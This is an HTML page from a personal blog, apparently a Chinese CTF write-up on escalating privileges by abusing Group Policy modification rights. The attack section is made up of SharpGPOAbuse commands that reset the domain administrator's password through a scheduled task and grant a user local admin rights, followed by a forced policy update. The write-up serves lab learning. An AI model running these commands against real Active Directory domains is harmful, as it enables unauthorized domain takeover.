@@ -1,0 +1,193 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>策略组对象特权 提权 | .</title>
+<link rel="shortcut icon" href="https://BabelQwerty.github.io/favicon.ico?v=1667388313624">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://BabelQwerty.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="策略组对象特权 提权 | . - Atom Feed" href="https://BabelQwerty.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="信息收集，得知 SPRAY\hackzzdogs 用户有 策略组修改权限：
+
+操作
+// 通过 SharpGPOAbuse 工具 添加 用户即时任务
+.\SharpGPOAbuse.exe --AddComputerTask --TaskN..." />
+    <meta name="keywords" content="ctf,Privilege Escalation" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://BabelQwerty.github.io">
+  <img class="avatar" src="https://BabelQwerty.github.io/images/avatar.png?v=1667388313624" alt="">
+  </a>
+  <h1 class="site-title">
+    .
+  </h1>
+  <p class="site-description">
+    
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/aboutme" class="menu">
+          aboutme
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              策略组对象特权 提权
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-17
+              </span>
+              <span>
+                1 min read
+              </span>
+              
+                <a href="https://BabelQwerty.github.io/tag/-KiB7P8k4/" class="post-tag">
+                  # ctf
+                </a>
+              
+                <a href="https://BabelQwerty.github.io/tag/ItW0G-hqED/" class="post-tag">
+                  # Privilege Escalation
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>信息收集，得知 SPRAY\hackzzdogs 用户有 策略组修改权限：<br>
+<img src="https://BabelQwerty.github.io/post-images/1666022924564.jpg" alt="" loading="lazy"></p>
+<p>操作</p>
+<pre><code>// 通过 SharpGPOAbuse 工具 添加 用户即时任务
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName &quot;Debug&quot; --Author SPARY\administrator --command &quot;cmd.exe&quot; --Arguments &quot;net user administrator qwerty /domain&quot; --GPOName &quot;DCPolicy&quot;
+
+
+// 通过 SharpGPOAbuse 给 hackzzdogs用户 添加管理员权限
+ .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount hackzzdogs --GPOName &quot;DCPolicy&quot; --force
+</code></pre>
+<pre><code>// 执行后要 更新 GPO 策略
+gpupdate /force
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://BabelQwerty.github.io/post-images/1666023448749.jpg" alt="" loading="lazy"></figure>
+<p>成功添加管理员权限<br>
+<img src="https://BabelQwerty.github.io/post-images/1666023576521.jpg" alt="" loading="lazy"></p>
+<p>SharpGPOAbuse: https://github.com/FSecureLABS/SharpGPOAbuse</p>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://BabelQwerty.github.io/post/about/">
+              <h3 class="post-title">
+                about me 
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/BigDie" target="_blank">BigDie</a>
+  <a class="rss" href="https://BabelQwerty.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
